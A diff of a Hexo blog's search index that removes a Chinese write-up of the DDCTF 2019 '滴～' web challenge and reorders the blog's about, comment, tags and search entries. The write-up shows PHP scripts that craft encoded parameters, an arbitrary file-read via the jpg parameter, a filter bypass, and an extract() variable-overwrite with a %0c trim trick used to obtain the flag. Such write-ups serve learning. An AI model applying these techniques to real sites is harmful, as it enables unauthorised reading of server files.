@@ -4,27 +4,6 @@
   
     
     <entry>
-      <title>DDCTF Writeup</title>
-      <link href="/2019/04/13/DDCTF%20Writeup/"/>
-      <url>/2019/04/13/DDCTF%20Writeup/</url>
-      
-        <content type="html"><![CDATA[<h1 id="DDCTF-Writeup"><a href="#DDCTF-Writeup" class="headerlink" title="DDCTF Writeup"></a>DDCTF Writeup</h1><h2 id="滴～"><a href="#滴～" class="headerlink" title="滴～"></a>滴～</h2><ul><li>题目的地址：<a href="http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09" target="_blank" rel="noopener">http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</a></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>TmpZMlF6WXhOamN5UlRaQk56QTJOdz09<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">flag.jpg<span class="tag">&lt;/<span class="name">br</span>&gt;</span>flag.jpg<span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'data:image/gif;base64,****&gt;&lt;/img&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li>查看HTML源码可以看到只有一个标题和一张base64的图片<img src="https://cdn.nlark.com/yuque/0/2019/png/258133/1555160848269-ebff8da5-4caf-4e41-95de-8dce152fc169.png#align=left&amp;display=inline&amp;height=65&amp;name=image.png&amp;originHeight=65&amp;originWidth=61&amp;size=7498&amp;status=done&amp;width=61" alt="image.png"></li><li>TmpZMlF6WXhOamN5UlRaQk56QTJOdz09这个一看就是base64编码的，解码两次</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$txt = <span class="string">'TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_decode(base64_decode($txt));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> hex2bin(base64_decode(base64_decode($txt)));</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"> <span class="number">666</span>C61672E6A7067</span><br><span class="line">flag.jpg</span><br><span class="line">Process finished with <span class="keyword">exit</span> code <span class="number">0</span></span><br></pre></td></tr></table></figure><ul><li>得到文件名为flag.jpg。也就是上面的图片，这里可能存在文件包含的漏洞。然后我们逆过来生成index.php的。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$txt = <span class="string">'TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_decode(base64_decode($txt));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> hex2bin(base64_decode(base64_decode($txt)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">$flag = base64_encode(base64_encode(bin2hex(<span class="string">"index.php"</span>)));</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"> <span class="number">666</span>C61672E6A7067</span><br><span class="line">flag.jpg</span><br><span class="line">TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span><br><span class="line">Process finished with <span class="keyword">exit</span> code <span class="number">0</span></span><br></pre></td></tr></table></figure><ul><li>得到index.php的编码后的为TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</li><li>打开<a href="http://117.51.150.246/index.php?jpg=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3" target="_blank" rel="noopener">http://117.51.150.246/index.php?jpg=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</a>，拿到base编码的index.php的源码。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">index.php<span class="tag">&lt;/<span class="name">br</span>&gt;</span>index.php<span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'data:image/gif;base64,PD9waHANCi8qDQogKiBodHRwczovL2Jsb2cuY3Nkbi5uZXQvRmVuZ0JhbkxpdVl1bi9hcnRpY2xlL2RldGFpbHMvODA2MTY2MDcNCiAqIERhdGU6IEp1bHkgNCwyMDE4DQogKi8NCmVycm9yX3JlcG9ydGluZyhFX0FMTCB8fCB+RV9OT1RJQ0UpOw0KDQoNCmhlYWRlcignY29udGVudC10eXBlOnRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Jyk7DQppZighIGlzc2V0KCRfR0VUWydqcGcnXSkpDQogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2pwZz1UbXBaTWxGNldYaE9hbU41VWxSYVFrNTZRVEpPZHowOScpOw0KJGZpbGUgPSBoZXgyYmluKGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkX0dFVFsnanBnJ10pKSk7DQplY2hvICc8dGl0bGU+Jy4kX0dFVFsnanBnJ10uJzwvdGl0bGU+JzsNCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwiIiwgJGZpbGUpOw0KZWNobyAkZmlsZS4nPC9icj4nOw0KJGZpbGUgPSBzdHJfcmVwbGFjZSgiY29uZmlnIiwiISIsICRmaWxlKTsNCmVjaG8gJGZpbGUuJzwvYnI+JzsNCiR0eHQgPSBiYXNlNjRfZW5jb2RlKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSk7DQoNCmVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIi4kdHh0LiInPjwvaW1nPiI7DQovKg0KICogQ2FuIHlvdSBmaW5kIHRoZSBmbGFnIGZpbGU/DQogKg0KICovDQoNCj8+DQo='</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>解码后得到</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>上面的源码是从用户获取输入的jpg的参数，还原为文件名，然后正则把不是字母数字的都删除了，再判断有没有config这个单词，有则替换为!，得到最终文件名，然后把文件内容编码返回给用户。</li><li>提示：上面有一个CSDN的链接，刚刚开始在那盯了echo很久，然后看到评论了，把目标转到了这个博主另一篇文章，Vim编辑器的强制退出生成的文件。</li><li>猜了很久找到了<a href="http://117.51.150.246/practice.txt.swp" target="_blank" rel="noopener">http://117.51.150.246/practice.txt.swp</a>，打开得到f1ag!ddctf.php，访问f1ag!ddctf.php没有报404，证明文件存在。</li><li>利用前面发现的文件包含漏洞获取f1ag!ddctf.php里的内容，因为文件名中有一个叹号，而且正则之后又把叹号加回去了，所以在定义文件名是应该是把f1ag!ddctf.php的叹号改为config，让他帮我们还原回来。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = base64_encode(base64_encode(bin2hex(<span class="string">"f1agconfigddctf.php"</span>)));</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($flag)));</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="comment">//echo $file;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$f = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $f;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==</span><br><span class="line">f1ag!ddctf.php</span><br><span class="line">Process finished with <span class="keyword">exit</span> code <span class="number">0</span></span><br></pre></td></tr></table></figure><ul><li>得到编码文件名TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==</li><li>访问<a href>view-source:http://117.51.150.246/index.php?jpg=TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==</a>，获取f1ag!ddctf.php的源码，解码后得到</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$k = <span class="string">'hello'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'hello'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>上面的代码是先包含config.php文件，因为里面有$flag这个变量，第一个漏洞就是extract函数的变量覆盖，详细可以看<a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php/#extract" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/web/php/php/#extract</a>，我们可以从GET这里再传一个k参数进来覆盖掉文件里面的k。第二个就是trim函数没有过滤\f(%0c)，所以两个一起利用起来就是<a href="http://117.51.150.246/f1ag!ddctf.php?uid=&amp;k=\f(%0c" target="_blank" rel="noopener">http://117.51.150.246/f1ag!ddctf.php?uid=&amp;k=\f(%0c)</a>)，打开获得Flag为：DDCTF{436f6e67726174756c6174696f6e73}</li></ul>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web技术 </category>
-          
-          <category> 生活琐事 </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>WinRAR代码执行复现与利用</title>
       <link href="/2019/02/28/WinRAR%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
       <url>/2019/02/28/WinRAR%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
@@ -479,6 +458,28 @@
     
     
     <entry>
+      <title>关于</title>
+      <link href="/about/index.html"/>
+      <url>/about/index.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="联系方式："><a href="#联系方式：" class="headerlink" title="联系方式："></a>联系方式：</h2><ul><li>ID：三米前有蕉皮</li><li>Email：<a href="mailto:root@kali-team.cn">root@kali-team.cn</a></li><li>WeChat：Kali-Team</li></ul>]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>留言</title>
+      <link href="/comment/index.html"/>
+      <url>/comment/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>categories</title>
       <link href="/categories/index.html"/>
       <url>/categories/index.html</url>
@@ -501,22 +502,11 @@
     
     
     <entry>
-      <title>留言</title>
-      <link href="/comment/index.html"/>
-      <url>/comment/index.html</url>
+      <title>tags</title>
+      <link href="/tags/index.html"/>
+      <url>/tags/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>关于</title>
-      <link href="/about/index.html"/>
-      <url>/about/index.html</url>
-      
-        <content type="html"><![CDATA[<h2 id="联系方式："><a href="#联系方式：" class="headerlink" title="联系方式："></a>联系方式：</h2><ul><li>ID：三米前有蕉皮</li><li>Email：<a href="mailto:root@kali-team.cn">root@kali-team.cn</a></li><li>WeChat：Kali-Team</li></ul>]]></content>
       
     </entry>
     
@@ -526,17 +516,6 @@
       <title>Search</title>
       <link href="/search/index.html"/>
       <url>/search/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>tags</title>
-      <link href="/tags/index.html"/>
-      <url>/tags/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
